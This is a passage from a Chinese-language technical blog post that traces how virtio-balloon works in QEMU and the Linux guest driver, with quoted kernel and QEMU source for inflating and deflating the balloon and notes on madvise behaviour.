<p>qemu中可以加入deflate-on-oom的选项，这时候配置了balloon并不会让VM的可用内存变小，而是在VM可用内存不变的情况下增加了Used，之后不会影响VM程序的正常使用。<strong>5 当VM需要的内存大于balloon配置之后，会自动进行deflate 向host要内存 此时info balloon可以看到balloon的值被自动调大了</strong>。但是被调大之后是不会再自动缩小的</p>
<p><strong>6 VM自己swap的优先级是比deflate-on-oom的优先级高的</strong></p>
<p><strong>7 在VMlogout的时候 balloon进行回收 仍然能回收到</strong></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/edver/p/14684138.html">virtio简介（二） —— virtio-balloon guest侧驱动 - Edver - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="http://ssdxiao.github.io/linux/2017/03/20/Virtio-Balloon.html">Virtio-Balloon超详细分析 (ssdxiao.github.io)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">virtio_driver</span> <span class="title">virtio_balloon_driver</span> =</span> &#123;</span><br><span class="line">	.feature_table = features,</span><br><span class="line">	.feature_table_size = ARRAY_SIZE(features),</span><br><span class="line">	.driver.name =	KBUILD_MODNAME,</span><br><span class="line">	.driver.owner =	THIS_MODULE,</span><br><span class="line">	.id_table =	id_table,</span><br><span class="line">	.validate =	virtballoon_validate,</span><br><span class="line">	.probe =	virtballoon_probe,</span><br><span class="line">	.remove =	virtballoon_remove,</span><br><span class="line">	.config_changed = virtballoon_changed,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PM_SLEEP</span></span><br><span class="line">	.freeze	=	virtballoon_freeze,</span><br><span class="line">	.restore =	virtballoon_restore,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>本身暴露的接口并不多 可以认为就<code>virtballoon_changed</code>一个</p>
<p>这个内核模块是前端</p>
<p>需要qemu添加<code>-device virtio-balloon-pci</code>在宿主机上创建一个balloon后端</p>
<p>qemu monitor中的balloon指令会向VM中的驱动发送指令，从而调用<code>virtballoon_changed</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __virtio_config_changed(<span class="keyword">struct</span> virtio_device *dev)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">virtio_driver</span> *<span class="title">drv</span> =</span> drv_to_virtio(dev-&gt;dev.driver);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!dev-&gt;config_enabled)</span><br><span class="line">		dev-&gt;config_change_pending = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (drv &amp;&amp; drv-&gt;config_changed)</span><br><span class="line">		drv-&gt;config_changed(dev);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>update_balloon_size_func</code> 每次<code>virtballoon_changed</code>只会发生一次 但是调整大小的函数会触发很多次 不是一次性调整好的，并且<code>virtballoon_changed</code>是异步。如果每次update输出时间影响效率</p>
<p>内核启动时<code>vp_find_vqs_intx</code>注册<code>vp_interrupt</code> 之后向队列写入信息时会产生中断</p>
<p><code>vp_interrupt</code>-&gt;<code>vp_config_changed</code>-&gt;<code>virtio_config_changed</code>-&gt;<code>__virtio_config_changed</code></p>
<p>注册vp_interrupt的函数 追踪调用 发现是probe的init_vqs probe由virio_bus的probe调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">bind_store</span><span class="params">(<span class="keyword">struct</span> device_driver *drv, <span class="type">const</span> <span class="type">char</span> *buf,</span></span><br><span class="line"><span class="params">			  <span class="type">size_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bus_type</span> *<span class="title">bus</span> =</span> bus_get(drv-&gt;bus);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="type">int</span> err = -ENODEV;</span><br><span class="line"></span><br><span class="line">	dev = bus_find_device_by_name(bus, <span class="literal">NULL</span>, buf);</span><br><span class="line">	<span class="keyword">if</span> (dev &amp;&amp; driver_match_device(drv, dev)) &#123;</span><br><span class="line">		err = device_driver_attach(drv, dev);</span><br><span class="line">		<span class="keyword">if</span> (!err) &#123;</span><br><span class="line">			<span class="comment">/* success */</span></span><br><span class="line">			err = count;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	put_device(dev);</span><br><span class="line">	bus_put(bus);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> device *<span class="title function_">bus_find_device</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bus_type *bus,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> device *start, <span class="type">const</span> <span class="type">void</span> *data,</span></span><br><span class="line"><span class="params">			       <span class="type">int</span> (*match)(<span class="keyword">struct</span> device *dev, <span class="type">const</span> <span class="type">void</span> *data))</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subsys_private</span> *<span class="title">sp</span> =</span> bus_to_subsys(bus);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">klist_iter</span> <span class="title">i</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sp)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	klist_iter_init_node(&amp;sp-&gt;klist_devices, &amp;i,</span><br><span class="line">			     (start ? &amp;start-&gt;p-&gt;knode_bus : <span class="literal">NULL</span>));</span><br><span class="line">	<span class="keyword">while</span> ((dev = next_device(&amp;i)))</span><br><span class="line">		<span class="keyword">if</span> (match(dev, data) &amp;&amp; get_device(dev))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	klist_iter_exit(&amp;i);</span><br><span class="line">	subsys_put(sp);</span><br><span class="line">	<span class="keyword">return</span> dev;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">device_match_name</span><span class="params">(<span class="keyword">struct</span> device *dev, <span class="type">const</span> <span class="type">void</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> sysfs_streq(dev_name(dev), name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所有device维护在bus这个数据结构中</p>
<p><code>mdev_device_create</code> 创建device</p>
<p>对于qemu的info操作 似乎并不会触发内核的函数 如何通过一个接口看一下时间？</p>
<p>在update size函数中 如果无变化返回之前 加入print</p>
<p>即想查看的时候同样用修改的接口 输入一个不变的值即可</p>
<p>从结果来看比较准确且稳定</p>
<p>fill_balloon会从内核模块alloc page 表示已经拿了这个page 所以guest kernel没法用了</p>
<p>leak_balloon释放这个page</p>
<h3 id="fill"><a href="#fill" class="headerlink" title="fill"></a>fill</h3><h4 id="guest"><a href="#guest" class="headerlink" title="guest"></a>guest</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> page *<span class="title function_">balloon_page_alloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> alloc_page(balloon_mapping_gfp_mask() |</span><br><span class="line">				       __GFP_NOMEMALLOC | __GFP_NORETRY);</span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="title function_">fill_balloon</span><span class="params">(<span class="keyword">struct</span> virtio_balloon *vb, <span class="type">size_t</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> num_allocated_pages;</span><br><span class="line">	<span class="type">unsigned</span> num_pfns;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	LIST_HEAD(pages);</span><br><span class="line">	num = min(num, ARRAY_SIZE(vb-&gt;pfns));</span><br><span class="line">	<span class="keyword">for</span> (num_pfns = <span class="number">0</span>; num_pfns &lt; num;</span><br><span class="line">	     num_pfns += VIRTIO_BALLOON_PAGES_PER_PAGE) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> balloon_page_alloc();</span><br><span class="line">		...</span><br><span class="line">		<span class="comment">//local list 和balloon_page_pop对应 只是一次性全部alloc而已</span></span><br><span class="line">		balloon_page_push(&amp;pages, page);</span><br><span class="line">	&#125;</span><br><span class="line">	mutex_lock(&amp;vb-&gt;balloon_lock);</span><br><span class="line">	vb-&gt;num_pfns = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ((page = balloon_page_pop(&amp;pages))) &#123;</span><br><span class="line">        <span class="comment">//把这次拿到的page全部加入balloon中</span></span><br><span class="line">		balloon_page_enqueue(&amp;vb-&gt;vb_dev_info, page);</span><br><span class="line">		set_page_pfns(vb, vb-&gt;pfns + vb-&gt;num_pfns, page);</span><br><span class="line">		vb-&gt;num_pages += VIRTIO_BALLOON_PAGES_PER_PAGE;</span><br><span class="line">		<span class="keyword">if</span> (!virtio_has_feature(vb-&gt;vdev,</span><br><span class="line">					VIRTIO_BALLOON_F_DEFLATE_ON_OOM))</span><br><span class="line">            <span class="comment">//如果没开DEFLATE_ON_OOM guest内核可用的page是减少的</span></span><br><span class="line">			adjust_managed_page_count(page, <span class="number">-1</span>);</span><br><span class="line">		vb-&gt;num_pfns += VIRTIO_BALLOON_PAGES_PER_PAGE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	num_allocated_pages = vb-&gt;num_pfns;</span><br><span class="line">	<span class="keyword">if</span> (vb-&gt;num_pfns != <span class="number">0</span>)</span><br><span class="line">		tell_host(vb, vb-&gt;inflate_vq);</span><br><span class="line">	mutex_unlock(&amp;vb-&gt;balloon_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> num_allocated_pages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010923083/article/details/115873669">内核内存] 伙伴系统4—alloc_pages(内存块分配)_早起的虫儿有鹰吃的博客-CSDN博客</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">tell_host</span><span class="params">(<span class="keyword">struct</span> virtio_balloon *vb, <span class="keyword">struct</span> virtqueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> len;</span><br><span class="line">	sg_init_one(&amp;sg, vb-&gt;pfns, <span class="keyword">sizeof</span>(vb-&gt;pfns[<span class="number">0</span>]) * vb-&gt;num_pfns);</span><br><span class="line">	virtqueue_add_outbuf(vq, &amp;sg, <span class="number">1</span>, vb, GFP_KERNEL);</span><br><span class="line">	virtqueue_kick(vq);</span><br><span class="line">	wait_event(vb-&gt;acked, virtqueue_get_buf(vq, &amp;len));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">virtqueue_notify</span><span class="params">(<span class="keyword">struct</span> virtqueue *_vq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vring_virtqueue</span> *<span class="title">vq</span> =</span> to_vvq(_vq);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(vq-&gt;broken))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (!vq-&gt;notify(_vq)) &#123;</span><br><span class="line">		vq-&gt;broken = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">vp_notify</span><span class="params">(<span class="keyword">struct</span> virtqueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* we write the queue&#x27;s selector into the notification register to</span></span><br><span class="line"><span class="comment">	 * signal the other end */</span></span><br><span class="line">    <span class="comment">// value, addr</span></span><br><span class="line">	iowrite16(vq-&gt;index, (<span class="type">void</span> __iomem *)vq-&gt;priv);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里wait_event是一个宏 传入的第二个参数会一直被调用然后sleep</p>
<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(;;)&#123;</span><br><span class="line">	if (virtqueue_get_buf(vq, &amp;len))</span><br><span class="line">		break;</span><br><span class="line">	schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h4><p>virtio:<a target="_blank" rel="noopener" href="https://blog.csdn.net/xidianjiapei001/article/details/89293914">IO虚拟化 - virtio介绍及代码分析【转】_xidianjiapei001的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/edver/category/1939743.html">虚拟化 - 随笔分类 - Edver - 博客园 (cnblogs.com)</a></p>
<p>virtqueue初始化过程：</p>
<p>virtio_pci_legacy_probe 初始化回调函数</p>
<p><code>virtballoon_probe</code>-&gt;<code>init_vqs</code>-&gt;<code>virtio_find_vqs</code>-&gt;<code>find_vqs(vp_find_vqs)</code>-&gt;<code>vp_find_vqs_msix</code>-&gt;<code>vp_setup_vq(setup_vq)</code>-&gt;<code>vring_create_virtqueue</code></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/edver/p/14684117.html">virtio简介（三） —— virtio-balloon qemu设备创建 - Edver - 博客园 (cnblogs.com)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_balloon_device_realize</span><span class="params">(DeviceState *dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIODevice *vdev = VIRTIO_DEVICE(dev);</span><br><span class="line">    VirtIOBalloon *s = VIRTIO_BALLOON(dev);</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    virtio_init(vdev, VIRTIO_ID_BALLOON, virtio_balloon_config_size(s));</span><br><span class="line"></span><br><span class="line">    ret = qemu_add_balloon_handler(virtio_balloon_to_target,</span><br><span class="line">                                   virtio_balloon_stat, s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;Only one balloon device is supported&quot;</span>);</span><br><span class="line">        virtio_cleanup(vdev);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (virtio_has_feature(s-&gt;host_features, VIRTIO_BALLOON_F_FREE_PAGE_HINT) &amp;&amp;</span><br><span class="line">        !s-&gt;iothread) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;&#x27;free-page-hint&#x27; requires &#x27;iothread&#x27; to be set&quot;</span>);</span><br><span class="line">        virtio_cleanup(vdev);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s-&gt;ivq = virtio_add_queue(vdev, <span class="number">128</span>, virtio_balloon_handle_output);</span><br><span class="line">    s-&gt;dvq = virtio_add_queue(vdev, <span class="number">128</span>, virtio_balloon_handle_output);</span><br><span class="line">    s-&gt;svq = virtio_add_queue(vdev, <span class="number">128</span>, virtio_balloon_receive_stats);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_queue_notify_vq</span><span class="params">(VirtQueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (vq-&gt;vring.desc &amp;&amp; vq-&gt;handle_output) &#123;</span><br><span class="line">        VirtIODevice *vdev = vq-&gt;vdev;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(vdev-&gt;broken)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq);</span><br><span class="line">        vq-&gt;handle_output(vdev, vq);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(vdev-&gt;start_on_kick)) &#123;</span><br><span class="line">            virtio_set_started(vdev, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_balloon_handle_output</span><span class="params">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIOBalloon *s = VIRTIO_BALLOON(vdev);</span><br><span class="line">    VirtQueueElement *elem;</span><br><span class="line">    MemoryRegionSection section;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        PartiallyBalloonedPage pbp = &#123;&#125;;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint32_t</span> pfn;</span><br><span class="line"></span><br><span class="line">        elem = virtqueue_pop(vq, <span class="keyword">sizeof</span>(VirtQueueElement));</span><br><span class="line">        <span class="keyword">if</span> (!elem) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (iov_to_buf(elem-&gt;out_sg, elem-&gt;out_num, offset, &amp;pfn, <span class="number">4</span>) == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> p = virtio_ldl_p(vdev, &amp;pfn);</span><br><span class="line">            hwaddr pa;</span><br><span class="line"></span><br><span class="line">            pa = (hwaddr) p &lt;&lt; VIRTIO_BALLOON_PFN_SHIFT;</span><br><span class="line">            offset += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">            section = memory_region_find(get_system_memory(), pa,</span><br><span class="line">                                         BALLOON_PAGE_SIZE);</span><br><span class="line">            <span class="keyword">if</span> (!section.mr) &#123;</span><br><span class="line">                trace_virtio_balloon_bad_addr(pa);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!memory_region_is_ram(section.mr) ||</span><br><span class="line">                memory_region_is_rom(section.mr) ||</span><br><span class="line">                memory_region_is_romd(section.mr)) &#123;</span><br><span class="line">                trace_virtio_balloon_bad_addr(pa);</span><br><span class="line">                memory_region_unref(section.mr);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            trace_virtio_balloon_handle_output(memory_region_name(section.mr),</span><br><span class="line">                                               pa);</span><br><span class="line">            <span class="keyword">if</span> (!virtio_balloon_inhibited()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vq == s-&gt;ivq) &#123;</span><br><span class="line">                    balloon_inflate_page(s, section.mr,</span><br><span class="line">                                         section.offset_within_region, &amp;pbp);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (vq == s-&gt;dvq) &#123;</span><br><span class="line">                    balloon_deflate_page(s, section.mr, section.offset_within_region);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    g_assert_not_reached();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            memory_region_unref(section.mr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        virtqueue_push(vq, elem, <span class="number">0</span>);</span><br><span class="line">        virtio_notify(vdev, vq);</span><br><span class="line">        g_free(elem);</span><br><span class="line">        virtio_balloon_pbp_free(&amp;pbp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>inflate操作是guest会立即把内存还给host</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">balloon_inflate_page</span><span class="params">(VirtIOBalloon *balloon,</span></span><br><span class="line"><span class="params">                                 MemoryRegion *mr, hwaddr mr_offset,</span></span><br><span class="line"><span class="params">                                 PartiallyBalloonedPage *pbp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *addr = memory_region_get_ram_ptr(mr) + mr_offset;</span><br><span class="line">    <span class="type">ram_addr_t</span> rb_offset, rb_aligned_offset, base_gpa;</span><br><span class="line">    RAMBlock *rb;</span><br><span class="line">    <span class="type">size_t</span> rb_page_size;</span><br><span class="line">    <span class="type">int</span> subpages;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX is there a better way to get to the RAMBlock than via a</span></span><br><span class="line"><span class="comment">     * host address? */</span></span><br><span class="line">    rb = qemu_ram_block_from_host(addr, <span class="literal">false</span>, &amp;rb_offset);</span><br><span class="line">    rb_page_size = qemu_ram_pagesize(rb);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rb_page_size == BALLOON_PAGE_SIZE) &#123;</span><br><span class="line">        <span class="comment">/* Easy case */</span></span><br><span class="line"></span><br><span class="line">        ram_block_discard_range(rb, rb_offset, rb_page_size);</span><br><span class="line">        <span class="comment">/* We ignore errors from ram_block_discard_range(), because it</span></span><br><span class="line"><span class="comment">         * has already reported them, and failing to discard a balloon</span></span><br><span class="line"><span class="comment">         * page is not fatal */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	...<span class="comment">//经过测试 基本都是easy case</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ram_block_discard_range会调madvice</p>
<blockquote>
<p>MADV_WILLNEED<br>Expect access in the near future. (Hence, it might be a good idea to read some pages ahead.)</p>
<p>MADV_DONTNEED<br>Do not expect access in the near future. (For the time being, the application is finished with the given range, so the kernel can free resources associated with it.) Subsequent accesses of pages in this range will succeed, but will result either in reloading of the memory contents from the underlying mapped file (see mmap(2)) or zero-fill-on-demand pages for mappings without an underlying file.<br>MADV_REMOVE (Since Linux 2.6.16)<br>Free up a given range of pages and its associated backing store. Currently, only shmfs&#x2F;tmpfs supports this; other file systems return with the error ENOSYS.</p>
</blockquote>
<p>经过尝试后发现 <strong>通过mmap拿的内存 madvise <code>MADV_DONTNEED</code> 是会立即被回收的</strong></p>
<p>实际上这里一定需要unmap ept 否则需要相信guest kernel不会访问已经被释放的页 但是VMM不相信VM</p>
